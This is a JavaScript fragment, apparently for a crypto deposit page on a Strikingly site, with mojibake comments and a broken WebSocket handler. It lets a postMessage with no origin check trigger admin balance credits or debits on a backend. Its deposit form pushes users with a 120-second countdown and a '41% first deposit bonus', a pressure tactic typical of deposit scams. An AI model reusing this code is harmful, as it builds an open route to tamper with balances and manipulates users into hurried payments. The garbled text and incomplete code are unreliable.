   - å•å¸ç§ Binance WSï¼ˆselected symbol@tickerï¼‰
   - postWithFallbackï¼ˆ/proxy ä¼˜å…ˆ -> /api/order å›é€€ï¼‰

const API_BASE = "https://crypto-management-production-5e04.up.railway.app";

/* ---------- é€šç”¨å·¥å…·ï¼ˆpostWithFallbackï¼‰ ---------- */
async function postWithFallback(urls, options={}, retries=1, delay=500){
  for (let i=0;i<urls.length;i++){
    const u = urls[i];
    try{
      for (let r=0;r<=retries;r++){
        try{
          const res = await fetch(u, options);
          if (res.status === 404) throw { code:404 };
          return res;
        }catch(e){
          if (r===retries) throw e;
          await new Promise(s=>setTimeout(s, delay));
        }
      }
    }catch(e){
      if (i === urls.length - 1) throw e;
      // try next url
    }
  }
  throw new Error('No available url');
}

/* ---------- Strikingly userId è‡ªåŠ¨åŒæ­¥ ---------- */
function detectStrikinglyUserId(){
  // å¸¸è§å˜é‡ï¼šwindow.strikinglyUserId / window._sr_user / window.SR_USER / query param ?userid=
  try{
    const urlParams = new URLSearchParams(window.location.search);
    let uid = urlParams.get("userid") || urlParams.get("userId") || urlParams.get("userID");
    if(!uid){
      if(window.strikinglyUserId) uid = window.strikinglyUserId;
      else if(window._sr_user && window._sr_user.id) uid = window._sr_user.id;
      else if(window.SR_USER && window.SR_USER.id) uid = window.SR_USER.id;
    }
    if(!uid){
      uid = localStorage.getItem("userid4");
      if(!uid){
        uid = Math.floor(1000 + Math.random()*9000).toString();
        localStorage.setItem("userid4", uid);
      }
    } else {
      // keep short 4-digit style if it's long numeric
      if(typeof uid === "string" && uid.length > 6) {
        // try to shorten preserving uniqueness
        const tail = uid.slice(-4);
        uid = tail;
      }
      localStorage.setItem("userid4", uid);
    }

    // sync to backend non-blocking
    (async ()=>{
      try{
        await postWithFallback([`${API_BASE}/proxy/users/sync`, `${API_BASE}/api/users/sync`], {
          method:'POST',
          headers:{ 'Content-Type':'application/json', 'X-User-Id': uid },
          body: JSON.stringify({ userid: uid, source: 'strikingly' })
        }, 1, 400);
      }catch(e){}
    })();

    return uid;
  }catch(e){
    return '0000';
  }
}
const USERID = detectStrikinglyUserId();

/* ---------- ç®¡ç†åå°æ§åˆ¶ï¼šæ¥æ”¶ postMessageï¼Œå…è®¸å……å€¼/æ‰£æ¬¾ ---------- */
/*
  ç®¡ç†åå°ä¼šé€šè¿‡ window.postMessage({ type:'admin_adjust_balance', userid:'1234', amount: '10.00', action:'credit' }, '*')
  æˆ‘ä»¬ä¼šï¼š
    1) æ›´æ–°é¡µé¢å³ä¸Šï¼ˆè‹¥å­˜åœ¨ï¼‰ä½™é¢æ˜¾ç¤ºï¼ˆä¼šåˆ›å»ºä¸€ä¸ªå°å…ƒç´ ï¼Œä¸ç ´ååŸæœ‰ UIï¼‰
    2) å‘åç«¯å‘é€é€šçŸ¥ï¼ˆ/proxy/admin/adjust -> /api/admins/adjustï¼‰
    3) å‘é€ Telegram é€šçŸ¥ï¼ˆä¿æŒåŸæœ‰ sendTelegramï¼‰
*/
function handleAdminAdjust(msg){
  try{
    const { userid, amount, action, reason } = msg;
    const payload = { admin: true, userid, amount, action, reason: reason||'manual' , time_us: formatUsTime(Date.now()), timestamp: Date.now() };
    // persist call to backend (non-blocking)
    postWithFallback([`${API_BASE}/proxy/admin/adjust`, `${API_BASE}/api/admins/adjust`], {
      method:'POST', headers:{ 'Content-Type':'application/json', 'X-User-Id': userid }, body: JSON.stringify(payload)
    }).catch(()=>{});
    // also send to order endpoint (dual route)
    postWithFallback([`${API_BASE}/proxy/order/admin`, `${API_BASE}/api/order/admin`], {
      method:'POST', headers:{ 'Content-Type':'application/json', 'X-User-Id': userid }, body: JSON.stringify({ ...payload, orderId: `ADM-${Date.now()}` })
    }).catch(()=>{});

    // update a small top-right balance box
    updateTopRightBalanceDisplay(userid, amount, action);
  }catch(e){
    console.warn('handleAdminAdjust error', e);
  }
}

function formatUsTime(ts){
  const d = ts ? new Date(Number(ts)) : new Date();
  const s = d.toLocaleString('en-US', { timeZone:'America/New_York', month:'2-digit', day:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:true });
  return s.replace(',', '');
}

function connectWS(symbol){
  try{
    if(ws) try{ ws.close(); }catch(e){}
    if(!symbol) return;
    ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbol.toLowerCase()}usdt@ticker`);

      try{
        const d = JSON.parse(ev.data);

        updateUSDT();
      }catch(e){}
    };
    ws.onclose = ()=> setTimeout(()=>{ try{ connectWS(symbol); }catch(e){} }, 2000);
  }catch(e){
    console.warn('connectWS failed', e);
  }
}

function updateUSDT(){
  try{
    const amount = parseFloat(amountInput.value) || 0;
    const usdt = amount * (currentPrice || 1); // å¦‚æœæ²¡å®æ—¶ä»·ï¼ŒæŒ‰ 1 å…œåº•ï¼ˆé¿å… NaNï¼‰
    usdtDisplay.textContent = `USDT: ${usdt.toFixed(2)}`;
    let boost = 0;
    if(!firstDepositUsed && amount > 0 && (countdown > 0 || countdownTimer)){
      boost = usdt * 0.41;
      boostDisplay.style.display = "block";
      boostDisplay.textContent = `First Deposit Boost: +${boost.toFixed(2)}`;
      boostHint.style.display = "block";
      boostSeconds.textContent = countdown > 0 ? countdown : 0;
      boostTimerText.className = "boost-note";
      boostTimerText.textContent = `ğŸ¤– Please recharge within ${countdown} seconds, otherwise you will not be able to receive the 41% bonus on your first recharge.`;
    } else {
      boostDisplay.style.display = "none";
      if(firstDepositUsed){
        boostHint.style.display = "block";
        boostTimerText.textContent = "â›” The 41% bonus for first recharge has been used or expired.";
        boostTimerText.className = "boost-expired";
      } else {
        boostHint.style.display = "none";
      }
    }
    totalDisplay.textContent = `Total: ${(usdt + boost).toFixed(2)} USDT`;
  }catch(e){
    console.warn('updateUSDT error', e);
  }
}

function startCountdownIfNeeded(){
  if(firstDepositUsed || countdownTimer) return;
  if((parseFloat(amountInput.value) || 0) <= 0) return;
  countdown = 120;
  boostHint.style.display = "block";
  boostSeconds.textContent = countdown;
  countdownTimer = setInterval(()=>{
    countdown--;
    boostSeconds.textContent = countdown;
    if(countdown <= 0){
      clearInterval(countdownTimer); countdownTimer = null; firstDepositUsed = true; localStorage.setItem("first_deposit_used","1");
      boostDisplay.style.display = "none";
      boostHint.style.display = "block";
      boostTimerText.textContent = "â›” More than 120 seconds have passed, the 41% first deposit reward cannot be obtained.";
      boostTimerText.className = "boost-expired";
      updateUSDT();
    }
  }, 1000);
}
